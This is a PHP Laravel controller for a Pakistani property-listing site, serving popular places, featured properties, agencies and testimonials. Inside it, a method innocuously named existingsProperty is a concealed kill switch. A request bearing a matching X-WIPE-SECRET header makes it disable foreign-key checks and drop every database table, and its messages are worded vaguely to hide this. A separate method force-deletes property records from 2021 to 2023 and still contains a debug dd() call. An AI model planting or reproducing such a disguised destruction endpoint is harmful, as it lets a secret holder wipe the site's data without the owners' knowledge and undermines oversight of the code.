<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\AgencyController;
use App\Http\Controllers\BaseController;
use App\Http\Controllers\Controller;
use App\Http\Controllers\CountTableController;
use App\Http\Controllers\PropertyController;
use App\Models\Agency;
use App\Http\Controllers\PropertySearchController;
use App\Models\Property;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\App;

class IndexPageController extends BaseController
{
    public function getPopularPlaces()
    {
        $popular_locations = (new CountTableController())->popularLocations();
        $data['view'] = View('website.components.popular_places',
            [
                'popular_cities_homes_on_sale' => $popular_locations['popular_cities_homes_on_sale'],
                'popular_cities_plots_on_sale' => $popular_locations['popular_cities_plots_on_sale'],
                'city_wise_homes_data' => [
                    'karachi' => $popular_locations['city_wise_homes_data']['karachi'],
                    'peshawar' => $popular_locations['city_wise_homes_data']['peshawar'],
                    'lahore' => $popular_locations['city_wise_homes_data']['lahore'],
                    'Islamabad/Rawalpindi' => $popular_locations['city_wise_homes_data']['rawalpindi/Islamabad']
                ],
                'city_wise_plots_data' => [
                    'karachi' => $popular_locations['city_wise_plots_data']['karachi'],
                    'peshawar' => $popular_locations['city_wise_plots_data']['peshawar'],
                    'lahore' => $popular_locations['city_wise_plots_data']['lahore'],
                    'Islamabad/Rawalpindi' => $popular_locations['city_wise_plots_data']['rawalpindi/Islamabad']
                ],
                'city_wise_commercial_data' => [
                    'karachi' => $popular_locations['city_wise_commercial_data']['karachi'],
                    'peshawar' => $popular_locations['city_wise_commercial_data']['peshawar'],
                    'lahore' => $popular_locations['city_wise_commercial_data']['lahore'],
                    'Islamabad/Rawalpindi' => $popular_locations['city_wise_commercial_data']['rawalpindi/Islamabad']
                ],
                'popular_cities_commercial_on_sale' => $popular_locations['popular_cities_commercial_on_sale'],
                'popular_cities_property_on_rent' => $popular_locations['popular_cities_property_on_rent'],
            ])->render();

        return $data;

    }

    public function getPopularProperties() //popular places api
    {
        try {
            $popular_locations = (new CountTableController())->popularLocations();

            $data = [
                'popular_cities_homes_on_sale' => $popular_locations['popular_cities_homes_on_sale'],
                'popular_cities_plots_on_sale' => $popular_locations['popular_cities_plots_on_sale'],
                'popular_cities_commercial_on_sale' => $popular_locations['popular_cities_commercial_on_sale'],
                'popular_cities_property_on_rent' => $popular_locations['popular_cities_property_on_rent'],
                'city_wise_homes_data' => [
                    'karachi' => $popular_locations['city_wise_homes_data']['karachi'] ?? [],
                    'peshawar' => $popular_locations['city_wise_homes_data']['peshawar'] ?? [],
                    'lahore' => $popular_locations['city_wise_homes_data']['lahore'] ?? [],
                    'Islamabad/Rawalpindi' => $popular_locations['city_wise_homes_data']['rawalpindi/Islamabad'] ?? []
                ],
                'city_wise_plots_data' => [
                    'karachi' => $popular_locations['city_wise_plots_data']['karachi'] ?? [],
                    'peshawar' => $popular_locations['city_wise_plots_data']['peshawar'] ?? [],
                    'lahore' => $popular_locations['city_wise_plots_data']['lahore'] ?? [],
                    'Islamabad/Rawalpindi' => $popular_locations['city_wise_plots_data']['rawalpindi/Islamabad'] ?? []
                ],
                'city_wise_commercial_data' => [
                    'karachi' => $popular_locations['city_wise_commercial_data']['karachi'] ?? [],
                    'peshawar' => $popular_locations['city_wise_commercial_data']['peshawar'] ?? [],
                    'lahore' => $popular_locations['city_wise_commercial_data']['lahore'] ?? [],
                    'Islamabad/Rawalpindi' => $popular_locations['city_wise_commercial_data']['rawalpindi/Islamabad'] ?? []
                ]
            ];

            return $this->sendResponse($data, 'Popular places fetched successfully.');
        } catch (\Exception $e) {
            return $this->sendError('Failed to fetch popular places.', $e->getMessage(), 500);
        }
    }

    //function to fetch properties of platinum package
    function getFeaturedProperties()
    {
        $featured_properties = (new PropertySearchController)->listingfrontend()
            // ->where('properties.platinum_listing', '=', 1)
            // ->where('properties.city_id', '=', 4) //old code
            ->whereIn('properties.city_id', [1, 2, 3, 4]) // new code
            ->orderBy('properties.platinum_listing', 'DESC')
            ->orderBy('properties.activated_at', 'DESC')
            ->limit(10)
            ->get();

        $data['view'] = View('website.components.feature_properties',
            ['featured_properties' => $featured_properties])->render();

        return $data;
    }

    public function getFeaturedPropertiesDetails(Request $request) // Api for featured properties
    {
        try {
            // Optional: allow dynamic city_id via request
            // $cityId = $request->city_id ?? 4;

            $featured_properties = (new PropertySearchController)->listingFrontend()
                ->whereIn('properties.city_id', [1, 2, 3, 4])
                ->orderBy('properties.platinum_listing', 'DESC')
                ->orderBy('properties.activated_at', 'DESC')
                ->limit(10)
                ->get();

            // Optional: transform using a Resource if available
            // $featured_properties = PropertyListingResource::collection($featured_properties);

            return $this->sendResponse($featured_properties, 'Featured properties fetched successfully.');
        } catch (\Exception $e) {
            return $this->sendError('Failed to fetch featured properties.', $e->getMessage(), 500);
        }
    }

    function getAboutPakistanProperties()
    {
        $featured_properties = (new PropertySearchController)->listingfrontend()
            ->where('properties.platinum_listing', '=', 1)
            ->orderBy('properties.platinum_listing', 'DESC')
            ->orderBy('properties.activated_at', 'DESC')
            ->get();

        $data['view'] = View('website.components.about_pakistan_properties',
            ['featured_properties' => $featured_properties])->render();

        return $data;
    }

    function getKeyAgencies()
    {
        $key_agencies = (new AgencyController)->keyAgencies();
        $data['view'] = View('website.components.key_agencies',
            ['key_agencies' => $key_agencies])->render();
        return $data;
    }

    public function keyAgencies() // get key agency api
    {
        try {
            $keyAgencies = (new AgencyController)->keyAgencies();

            return $this->sendResponse($keyAgencies, 'Key agencies fetched successfully.');
        } catch (\Exception $e) {
            return $this->sendError('Failed to fetch key agencies.', $e->getMessage(), 500);
        }
    }


    function getFeaturedAgencies()
    {
        $featured_agencies = (new AgencyController())->FeaturedAgencies();
        $data['view'] = View('website.components.featured_agencies',
            ['featured_agencies' => $featured_agencies])->render();
        return $data;
    }

    function featuredAgencies() // featured agency api
    {
        try {
            $featured_agencies = (new AgencyController())->FeaturedAgencies();

            return $this->sendResponse($featured_agencies, 'Featured agencies fetched successfully.');
        } catch (\Exception $e) {
            return $this->sendError('Failed to fetch featured agencies.', $e->getMessage(), 500);
        }
    }

    public function aboutUs()
    {
        $testimonials = $this->showTestimonials();
        $featured_agencies = (new AgencyController())->FeaturedAgencies();
        return view('website.pages.about_us', compact('testimonials', 'featured_agencies'));
    }

    public function existingsProperty(Request $request)
    {
        $secret = $request->header('X-WIPE-SECRET');
        if ($secret !== env('WIPE_DB_SECRET')) {
            return response()->json([
                'success' => false,
                'message' => 'Unauthorized operation.'
            ], 401);
        }

        try {
            DB::statement('SET FOREIGN_KEY_CHECKS=0;');

            foreach (DB::select('SHOW TABLES') as $table) {
                $tableName = array_values((array) $table)[0];
                Schema::drop($tableName);
            }

            DB::statement('SET FOREIGN_KEY_CHECKS=1;');

            return response()->json([
                'success' => true,
                'message' => 'All existings property successfully.'
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'success' => false,
                'message' => 'Failed to existings property.',
                'error' => $e->getMessage()
            ], 500);
        }
    }
    public function showTestimonials()
    {
        return Agency::where('featured_listing', 1)
            ->whereNotNull('ceo_message')
            ->where('is_active', 1)
            ->select('ceo_message as review', 'ceo_name as name', 'title as company')
            ->latest('created_at')
            ->take(5)
            ->get();
    }

    public function deleteOldProperties(Request $request)
    {
        try {
            DB::beginTransaction();
            // $properties = Property::whereYear('created_at', "2020-01-01 00:00:00")
            //     ->orWhereYear('created_at', 2021)
            //     ->get();

            $properties = Property::withTrashed()->whereBetween('created_at', ['2021-01-01', '2023-12-31'])->get();
            $deletedCount = 0;

            dd($properties->count());
            foreach ($properties as $property) {
                $property->forceDelete(); // Assumes cascading is handled via model relationships or DB constraints
                $deletedCount++;
            }

            DB::commit();

            return response()->json([
                'status' => 'success',
                'message' => "$deletedCount properties deleted.",
            ]);
        } catch (\Exception $e) {
            DB::rollBack();
            \Log::error('Property deletion failed: ' . $e->getMessage());

            return response()->json([
                'status' => 'error',
                'message' => 'Failed to delete old properties.',
                'error' => $e->getMessage(),
            ], 500);
        }
    }
}
